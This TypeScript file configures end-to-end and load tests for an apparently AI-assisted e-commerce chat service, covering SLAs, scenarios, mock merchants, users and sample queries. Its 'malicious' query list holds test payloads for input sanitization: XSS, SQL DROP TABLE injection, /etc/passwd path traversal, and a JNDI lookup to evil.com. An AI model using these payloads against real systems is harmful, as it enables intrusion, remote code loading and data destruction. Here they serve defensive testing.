/**
 * Test Configuration for E2E Integration Tests
 * Defines test parameters, SLAs, and environment settings
 */

export interface TestSLAs {
  latency: {
    maxAverageMs: number;
    maxP95Ms: number;
    maxP99Ms: number;
  };
  performance: {
    maxErrorRate: number;
    minCacheHitRate: number;
    minThroughputRps: number;
  };
  cost: {
    maxCostPerSession: number;
    maxCostPerRequest: number;
  };
  quality: {
    minGroundingAccuracy: number;
    minConfidenceScore: number;
  };
}

export interface LoadTestConfig {
  concurrentUsers: {
    light: number;
    medium: number;
    heavy: number;
  };
  testDuration: {
    short: number;
    medium: number;
    long: number;
  };
  requestRates: {
    low: number;
    medium: number;
    high: number;
  };
}

export interface TestEnvironmentConfig {
  api: {
    baseUrl: string;
    timeout: number;
    retries: number;
  };
  auth: {
    enabled: boolean;
    tokenType: string;
    testToken: string;
  };
  database: {
    testMerchantIds: string[];
    testUserIds: string[];
    cleanupAfterTests: boolean;
  };
  aws: {
    region: string;
    mockServices: boolean;
    localstack: boolean;
  };
}

// Production SLAs
export const PRODUCTION_SLAS: TestSLAs = {
  latency: {
    maxAverageMs: 300,
    maxP95Ms: 500,
    maxP99Ms: 1000
  },
  performance: {
    maxErrorRate: 0.01, // 1%
    minCacheHitRate: 0.7, // 70%
    minThroughputRps: 100
  },
  cost: {
    maxCostPerSession: 0.05,
    maxCostPerRequest: 0.01
  },
  quality: {
    minGroundingAccuracy: 0.85, // 85%
    minConfidenceScore: 0.7 // 70%
  }
};

// Test environment SLAs (more relaxed for CI/CD)
export const TEST_SLAS: TestSLAs = {
  latency: {
    maxAverageMs: 600, // 2x production
    maxP95Ms: 1000, // 2x production
    maxP99Ms: 2000 // 2x production
  },
  performance: {
    maxErrorRate: 0.05, // 5% (higher for test environment)
    minCacheHitRate: 0.5, // 50% (lower for test environment)
    minThroughputRps: 50 // Lower for test environment
  },
  cost: {
    maxCostPerSession: 0.10, // 2x production
    maxCostPerRequest: 0.02 // 2x production
  },
  quality: {
    minGroundingAccuracy: 0.8, // 80% (slightly lower)
    minConfidenceScore: 0.6 // 60% (slightly lower)
  }
};

export const LOAD_TEST_CONFIG: LoadTestConfig = {
  concurrentUsers: {
    light: 10,
    medium: 50,
    heavy: 100 // Reduced from 1000 for test environment
  },
  testDuration: {
    short: 5000, // 5 seconds
    medium: 15000, // 15 seconds
    long: 30000 // 30 seconds
  },
  requestRates: {
    low: 5, // 5 req/s
    medium: 20, // 20 req/s
    high: 50 // 50 req/s
  }
};

export const TEST_ENVIRONMENT: TestEnvironmentConfig = {
  api: {
    baseUrl: process.env.TEST_API_BASE_URL || 'http://localhost:3000',
    timeout: parseInt(process.env.TEST_API_TIMEOUT || '10000', 10),
    retries: parseInt(process.env.TEST_API_RETRIES || '3', 10)
  },
  auth: {
    enabled: process.env.TEST_AUTH_ENABLED === 'true',
    tokenType: 'Bearer',
    testToken: process.env.TEST_AUTH_TOKEN || 'test-token-123'
  },
  database: {
    testMerchantIds: [
      'test-merchant-e2e-1',
      'test-merchant-e2e-2',
      'test-merchant-load-test'
    ],
    testUserIds: [
      'test-user-e2e-1',
      'test-user-e2e-2',
      'test-user-load-test'
    ],
    cleanupAfterTests: process.env.TEST_CLEANUP === 'true'
  },
  aws: {
    region: process.env.AWS_REGION || 'us-east-1',
    mockServices: process.env.TEST_MOCK_AWS === 'true',
    localstack: process.env.TEST_USE_LOCALSTACK === 'true'
  }
};

// Test scenarios configuration
export const TEST_SCENARIOS = {
  userJourney: {
    name: 'Complete User Journey',
    description: 'Tests full flow from session creation to purchase completion',
    steps: [
      'create_session',
      'upload_documents',
      'chat_query',
      'product_search',
      'checkout_process',
      'transaction_verification'
    ],
    expectedDuration: 5000, // 5 seconds max
    criticalPath: true
  },
  
  concurrentLoad: {
    name: 'Concurrent User Load',
    description: 'Tests system under concurrent user load',
    userCounts: [10, 25, 50, 100],
    duration: 30000, // 30 seconds
    rampUpTime: 5000, // 5 seconds
    criticalPath: true
  },
  
  sustainedLoad: {
    name: 'Sustained Load Test',
    description: 'Tests system under sustained load over time',
    requestRate: 20, // req/s
    duration: 60000, // 1 minute
    expectedStability: true,
    criticalPath: false
  },
  
  failoverRecovery: {
    name: 'Failover and Recovery',
    description: 'Tests system resilience during service failures',
    failureTypes: ['cache_failure', 'database_timeout', 'llm_service_error'],
    recoveryTime: 10000, // 10 seconds max
    criticalPath: true
  },
  
  securityCompliance: {
    name: 'Security and Compliance',
    description: 'Tests tenant isolation, PII protection, and input validation',
    testTypes: ['tenant_isolation', 'pii_redaction', 'input_sanitization'],
    criticalPath: true
  }
};

// Mock data for testing
export const TEST_DATA = {
  merchants: [
    {
      id: 'test-merchant-e2e-1',
      name: 'E2E Test Electronics Store',
      category: 'electronics',
      products: [
        {
          sku: 'WH-001',
          title: 'Wireless Headphones Pro',
          description: 'Premium wireless headphones with active noise cancellation',
          price: 199.99,
          category: 'audio',
          inStock: true
        },
        {
          sku: 'SP-002',
          title: 'Bluetooth Speaker',
          description: 'Portable bluetooth speaker with 12-hour battery life',
          price: 79.99,
          category: 'audio',
          inStock: true
        }
      ]
    },
    {
      id: 'test-merchant-e2e-2',
      name: 'E2E Test Fashion Store',
      category: 'fashion',
      products: [
        {
          sku: 'SH-001',
          title: 'Running Shoes',
          description: 'Lightweight running shoes with advanced cushioning',
          price: 129.99,
          category: 'footwear',
          inStock: true
        }
      ]
    }
  ],
  
  users: [
    {
      id: 'test-user-e2e-1',
      name: 'Test User One',
      preferences: {
        category: 'electronics',
        budget: 200,
        brand: 'premium'
      },
      demographics: {
        age: 30,
        location: 'US',
        income: 'high'
      }
    },
    {
      id: 'test-user-e2e-2',
      name: 'Test User Two',
      preferences: {
        category: 'fashion',
        budget: 150,
        style: 'casual'
      },
      demographics: {
        age: 25,
        location: 'US',
        income: 'medium'
      }
    }
  ],
  
  queries: {
    product_search: [
      'I need wireless headphones with good battery life',
      'Show me bluetooth speakers under $100',
      'What are the best running shoes for beginners?',
      'I want noise-cancelling headphones for travel'
    ],
    
    conversational: [
      'Hello, I need help finding a product',
      'What do you recommend for music lovers?',
      'Can you help me choose between these options?',
      'What are your most popular items?'
    ],
    
    purchase_intent: [
      'I want to buy the wireless headphones',
      'Add the bluetooth speaker to my cart',
      'How much does shipping cost?',
      'Can I get a discount on bulk orders?'
    ],
    
    malicious: [
      '<script>alert("xss")</script>',
      'SELECT * FROM users; DROP TABLE users;',
      '../../etc/passwd',
      '${jndi:ldap://evil.com/a}',
      'javascript:alert(1)'
    ]
  }
};

// Performance benchmarks for comparison
export const PERFORMANCE_BENCHMARKS = {
  baseline: {
    name: 'Baseline Performance',
    description: 'Expected performance under normal conditions',
    metrics: {
      averageLatency: 150, // ms
      p95Latency: 300, // ms
      throughput: 200, // req/s
      errorRate: 0.001, // 0.1%
      cacheHitRate: 0.8 // 80%
    }
  },
  
  underLoad: {
    name: 'Performance Under Load',
    description: 'Expected performance under high load',
    metrics: {
      averageLatency: 250, // ms
      p95Latency: 500, // ms
      throughput: 150, // req/s
      errorRate: 0.01, // 1%
      cacheHitRate: 0.7 // 70%
    }
  },
  
  degraded: {
    name: 'Degraded Performance',
    description: 'Acceptable performance during service issues',
    metrics: {
      averageLatency: 500, // ms
      p95Latency: 1000, // ms
      throughput: 50, // req/s
      errorRate: 0.05, // 5%
      cacheHitRate: 0.5 // 50%
    }
  }
};

export function getTestConfig(): {
  slas: TestSLAs;
  loadTest: LoadTestConfig;
  environment: TestEnvironmentConfig;
} {
  const isProduction = process.env.NODE_ENV === 'production';
  
  return {
    slas: isProduction ? PRODUCTION_SLAS : TEST_SLAS,
    loadTest: LOAD_TEST_CONFIG,
    environment: TEST_ENVIRONMENT
  };
}

export function getTestScenario(name: keyof typeof TEST_SCENARIOS) {
  return TEST_SCENARIOS[name];
}

export function getTestData() {
  return TEST_DATA;
}

export function getBenchmark(name: keyof typeof PERFORMANCE_BENCHMARKS) {
  return PERFORMANCE_BENCHMARKS[name];
}